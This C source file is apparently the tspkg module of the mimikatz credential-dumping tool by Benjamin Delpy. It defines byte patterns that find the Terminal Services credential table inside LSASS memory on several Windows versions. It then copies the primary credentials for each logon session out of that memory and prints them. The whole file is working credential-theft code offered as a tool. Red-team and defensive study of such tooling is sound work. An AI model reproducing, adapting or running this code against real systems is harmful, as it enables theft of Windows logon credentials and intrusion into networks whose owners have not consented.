/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kuhl_m_sekurlsa_tspkg.h"
#ifdef _M_X64
BYTE PTRN_WALL_TSGlobalCredTable[]	= {0x48, 0x83, 0xec, 0x20, 0x48, 0x8d, 0x0d};
KULL_M_PATCH_GENERIC TsPkgReferences[] = {
	{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WALL_TSGlobalCredTable),	PTRN_WALL_TSGlobalCredTable},	{0, NULL}, {7}},
};
#elif defined _M_IX86
BYTE PTRN_WNO8_TSGlobalCredTable[]	= {0x8b, 0xff, 0x55, 0x8b, 0xec, 0x51, 0x56, 0xbe};
BYTE PTRN_WIN8_TSGlobalCredTable[]	= {0x8b, 0xff, 0x53, 0xbb};
BYTE PTRN_WN81_TSGlobalCredTable[]	= {0x8b, 0xff, 0x57, 0xbf};
KULL_M_PATCH_GENERIC TsPkgReferences[] = {
	{KULL_M_WIN_BUILD_XP,		{sizeof(PTRN_WNO8_TSGlobalCredTable),	PTRN_WNO8_TSGlobalCredTable},	{0, NULL}, {8}},
	{KULL_M_WIN_BUILD_8,		{sizeof(PTRN_WIN8_TSGlobalCredTable),	PTRN_WIN8_TSGlobalCredTable},	{0, NULL}, {4}},
	{KULL_M_WIN_BUILD_BLUE,		{sizeof(PTRN_WN81_TSGlobalCredTable),	PTRN_WN81_TSGlobalCredTable},	{0, NULL}, {4}},
};
#endif

PRTL_AVL_TABLE TSGlobalCredTable = NULL;

KUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_tspkg_package = {L"tspkg", kuhl_m_sekurlsa_enum_logon_callback_tspkg, TRUE, L"tspkg.dll", {{{NULL, NULL}, 0, 0, NULL}, FALSE, FALSE}};
const PKUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_tspkg_single_package[] = {&kuhl_m_sekurlsa_tspkg_package};

NTSTATUS kuhl_m_sekurlsa_tspkg(int argc, wchar_t * argv[])
{
	return kuhl_m_sekurlsa_getLogonData(kuhl_m_sekurlsa_tspkg_single_package, 1);
}

void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_tspkg(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData)
{
	KIWI_TS_CREDENTIAL credentials;
	KIWI_TS_PRIMARY_CREDENTIAL primaryCredential;

	KULL_M_MEMORY_HANDLE hLocalMemory = {KULL_M_MEMORY_TYPE_OWN, NULL};
	KULL_M_MEMORY_ADDRESS aLocalMemory = {&credentials, &hLocalMemory}, aLsassMemory = {NULL, pData->cLsass->hLsassMem};
	PVOID buffer = NULL;

	if(kuhl_m_sekurlsa_tspkg_package.Module.isInit || kuhl_m_sekurlsa_utils_search_generic(pData->cLsass, &kuhl_m_sekurlsa_tspkg_package.Module, TsPkgReferences, ARRAYSIZE(TsPkgReferences), (PVOID *) &TSGlobalCredTable, NULL, NULL, NULL))
	{
		aLsassMemory.address = TSGlobalCredTable;
		if(aLsassMemory.address = kuhl_m_sekurlsa_utils_pFromAVLByLuid(&aLsassMemory, FIELD_OFFSET(KIWI_TS_CREDENTIAL, LocallyUniqueIdentifier), pData->LogonId))
		{
			if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(KIWI_TS_CREDENTIAL)))
			{
				if(aLsassMemory.address = credentials.pTsPrimary)
				{
					aLocalMemory.address = &primaryCredential;
					if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(KIWI_TS_PRIMARY_CREDENTIAL)))
						kuhl_m_sekurlsa_genericCredsOutput(&primaryCredential.credentials, pData, KUHL_SEKURLSA_CREDS_DISPLAY_DOMAIN);
				}
			}
		}
	} else kprintf(L"KO");
}